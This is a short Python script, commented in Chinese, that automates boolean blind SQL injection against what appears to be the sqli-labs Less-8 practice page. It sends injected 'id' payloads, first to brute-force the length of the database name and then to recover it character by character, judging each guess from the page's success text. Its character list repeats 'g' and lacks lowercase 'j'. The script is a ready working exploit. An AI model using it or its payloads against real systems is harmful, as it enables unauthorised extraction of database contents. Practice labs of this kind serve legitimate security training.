import urllib.parse
import urllib.request

# select length(database())=8
# and%20(select%20length(database())=8)
"""
python3 bool 注入脚本实例
id 选项可以进行bool盲注,通过判断You are in...........
"""

# URL 只有get请求 id表示参数 parameter 表示这个参数的内容
def do_it(parameter):

    URL = r'''http://192.168.156.8/sqli-labs/Less-8/'''
    payload = {'id':parameter}
    Send = urllib.parse.urlencode(payload)
    #print(parameter)
    req = urllib.request.Request(URL+'?'+ Send)
    #req.add_header('cookie','xx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    response = urllib.request.urlopen(req)
    the_page = response.read()
    if( the_page.find(b"You are in...........") != -1):
        return True
    else:
        return False

## 暴力枚举长度
payload1 = "1'and (select length(database())={length})#"
length = 0
for i in range(1,99):
    if(do_it( payload1.format(length=str(i)))):    
        length = i
        break
print("length is " + str(length))

## 暴力枚举，当然也可以使用其他的快速算法
word_list = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'    #匹配用的字符串
payload2 = "1'AND ascii(substr((select database()),{num},{num}))={test}#"

for i in range(1,length+1):
    for j in word_list:
        if(do_it( payload2.format(num=str(i),test = str(ord(j))))):
            print(j)
            break
